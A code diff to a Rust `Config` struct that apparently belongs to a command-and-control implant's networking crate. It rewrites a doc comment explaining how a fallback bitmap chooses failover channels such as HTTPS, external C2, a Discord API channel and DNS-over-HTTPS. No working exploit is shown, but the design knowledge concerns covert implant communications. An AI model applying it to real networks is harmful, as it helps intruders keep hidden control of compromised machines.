@@ -38,7 +38,14 @@ pub struct Config {
     // ---- Channel dispatcher config (spec-1) ----
     /// Primary channel (Channel enum u8 value). Default 0 = Https.
     pub primary_channel: u8,
-    /// Fallback bitmap: bit N set = Channel N is in the fallback chain.
+    /// Fallback bitmap: bit N set = Channel N is eligible for automatic
+    /// failover. Consumed at runtime by
+    /// `nyx_implant_net::channels::next_fallback_with_bitmap`: 0 = the
+    /// build-time default chain (backward compat); non-zero = the default
+    /// chain filtered to the set bits, chain order preserved. Bits for the
+    /// ExtC2 channels (5-7) are ignored — ExtC2 is never an automatic
+    /// fallback (same egress as Https) — and channel 8 (DiscordApi) cannot
+    /// be encoded in a u8.
     pub fallback_bitmap: u8,
     /// DoH resolver host (e.g. "cloudflare-dns.com"). Empty = not configured.
     pub doh_resolver: String,
